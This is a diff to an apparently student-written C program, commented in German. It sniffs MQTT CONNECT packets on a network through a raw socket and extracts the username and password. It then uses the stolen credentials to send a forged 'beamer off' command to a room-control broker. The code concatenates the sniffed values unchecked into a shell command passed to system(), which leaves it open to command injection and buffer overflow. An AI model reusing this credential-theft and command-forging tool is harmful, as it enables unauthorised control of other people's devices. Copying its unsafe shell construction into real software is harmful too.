@@ -3,6 +3,7 @@
 #include<string.h>    //für strings
 #include<sys/socket.h>
 #include<netinet/in.h>
+#include <unistd.h> // für strg c anfangen
 #include <zconf.h> // for open
 #include "PA2.h"
  
@@ -28,8 +29,35 @@ char protocol_name[1024];
 char cmd[] = "mosquitto_pub -m \"beamer off\" -t \"/uos/93/E06/beamer-control\" -u ";
 
 struct sockaddr_in source,dest; //erstelle Sockadress
+
+/**
+* Letzer aufruf um alles wichtige zu schließen
+*/
+void last_wish(int s){
+           printf("Manuel beendet\n");
+           if(sock_raw > 0) //nur falls ein socket offen ist
+           {
+               close(sock_raw); //schließe diesen
+               printf("Socket geschlossen\n");
+               return 1;
+           }
+           exit(1); 
+}
  
 int main(int argc, char **argv){
+ 
+   //Handlet aktivierung für STRG+C
+   //http://stackoverflow.com/questions/1641182/how-can-i-catch-a-ctrl-c-event-c
+   struct sigaction sigIntHandler;
+
+   sigIntHandler.sa_handler = last_wish;
+   sigemptyset(&sigIntHandler.sa_mask);
+   sigIntHandler.sa_flags = 0; //setze sa flags 0
+
+   sigaction(SIGINT, &sigIntHandler, NULL);
+   // Ende für STRG+C
+ 
+
     printf("Beginn Main...\n");
     unsigned int saddr_size;
     int data_size;
@@ -46,22 +74,28 @@ int main(int argc, char **argv){
     while(password_found==0)
     {
         saddr_size = sizeof saddr;
-        //Receive a packet
+        //Hole das Packet
         data_size = 0;
         data_size = recvfrom(sock_raw , buffer , 65536 , 0 , &saddr , &saddr_size);
      
          if(data_size <0 )
         {
+            close(sock_raw);
             printf("Recvfrom error , failed to get packets\n");
             return -1;
         }
-        //Now process the packet
+        //Jetzt weiterleitern des Packets
         forward_packet(buffer );
+        
+        //Passwort könnte nun gefunden sein
         if(password_found){
              
+             //Baue gefälschten Befehl zusammen
              strcat(cmd,user_name);
              strcat(cmd," -P ");
              strcat(cmd,password);
+         
+             //Und ab damit
              system(cmd);
              printf("Closing Socket");
              close(sock_raw);
@@ -105,17 +139,27 @@ int filter_connect_packet(char* Buffer)
     //Wir holen uns das Gesammte Payload Packer (inlc. Fixed Header, Variable Header, etc.)
     data_payload = get_tcp_payload(Buffer,&iph ,&tcph ); //Aufruf der Helper Funktion
  
-    char mqtt_packet_type = data_payload[0] & 0xF0; //MQTT Packet Typ ist von Bit 7-4 definiert --> Filtern dieser Bits
-    int is_connect_packet = mqtt_packet_type==16; // Wenn Bit 4 eine 1 ist ist es ein CONNECT Packet --> 0001000 = 16
  
-    if(is_connect_packet){
-       //printf("Found a Connect Packet !\n");
-       //Super wir haben ein CONNECT Packet gefunden und verarbeiten dies nun weiter
-       int res = filter_remaining_length(data_payload);
-       return res;
+    unsigned short* port_pointer = (unsigned short*)tcph;
+    unsigned short port = htons(port_pointer[1]);
+
+    if(port==1883){ //Falls richtiger port
+        char mqtt_packet_type = data_payload[0] & 0xF0; //MQTT Packet Typ ist von Bit 7-4 definiert --> Filtern dieser Bits
+        int is_connect_packet = mqtt_packet_type==16; // Wenn Bit 4 eine 1 ist ist es ein CONNECT Packet --> 0001000 = 16
+
+        if(is_connect_packet){
+           //printf("Found a Connect Packet !\n");
+           //Super wir haben ein CONNECT Packet gefunden und verarbeiten dies nun weiter
+           int res = filter_remaining_length(data_payload);
+           return res;
+        }
+        else{
+           return 0;
+        }
     }
+    //Das war nicht der richtige port, suche weiter
     else{
-       return 0;
+        return 0;
     }
 }
  
